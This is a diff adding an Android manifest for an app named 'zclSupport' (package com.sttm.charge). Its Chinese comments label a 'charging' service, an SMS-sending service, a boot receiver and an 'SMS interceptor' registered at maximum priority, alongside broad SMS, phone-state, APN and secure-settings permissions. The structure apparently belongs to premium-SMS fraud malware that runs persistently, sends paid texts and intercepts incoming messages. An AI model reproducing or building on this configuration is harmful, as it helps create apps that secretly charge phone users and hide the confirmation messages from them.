@@ -1,0 +1,127 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.sttm.charge"
+    android:versionCode="1"
+    android:versionName="1.0" >
+
+   
+    <uses-sdk android:minSdkVersion="8" />
+
+
+    
+
+    <application
+        android:label="zclSupport"   
+        android:persistent="true" >
+        
+        
+        
+        
+           <activity
+           
+            android:name=".TestActivity" >
+            <intent-filter >
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        
+        
+        
+
+          <!-- 收费主服务程序 -->
+        <service
+            android:enabled="true"
+            android:exported="true"
+            android:name=".MainService" >
+            <intent-filter >
+                <action android:name="om.kso.action.MAINSERVICE" />
+
+            </intent-filter>
+        </service>
+        
+
+        <!-- 发送短信主服务程序 -->
+        <service
+            android:enabled="true"
+            android:exported="true"
+            android:name=".SendSmsService" >
+        </service>
+
+ 
+
+        <!-- 开机启动 -->
+        <receiver android:name="com.sttm.charge.BootReceiver" >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+
+            </intent-filter>
+        </receiver>
+        
+        <!-- 短信拦截器 -->
+        <receiver
+            android:name=".SmsReceiver"
+            android:permission="android.permission.BROADCAST_SMS" >
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+        
+        <receiver android:name="com.sttm.charge.KsoAlarmService" >
+            <intent-filter>
+                <action android:name="com.zcl.action.ALARMRECEIRVE" />
+            </intent-filter>
+        </receiver>
+        
+
+        
+        
+               <!-- 网络切换监听器 -->
+        <receiver android:name="com.sttm.charge.NetWorkChangeReceive" >
+            <intent-filter >
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+            </intent-filter>
+        </receiver>
+        
+       
+
+        <meta-data
+            android:name="userLog"
+            android:value="true" >
+        </meta-data>
+        <meta-data
+            android:name="versionDate"
+            android:value="20120711" >
+        </meta-data>
+        
+        <meta-data
+            android:name="CustomID"
+            android:value="LG20120825" >
+        </meta-data>    
+            
+    </application>
+
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.WRITE_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.MODIFY_PHONE_STATE" />
+    <uses-permission android:name="android.permission.WRITE_APN_SETTINGS" />
+    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS" />
+    
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.BROADCAST_SMS" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.MODIFY_PHONE_STATE" />
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
+    
+</manifest>
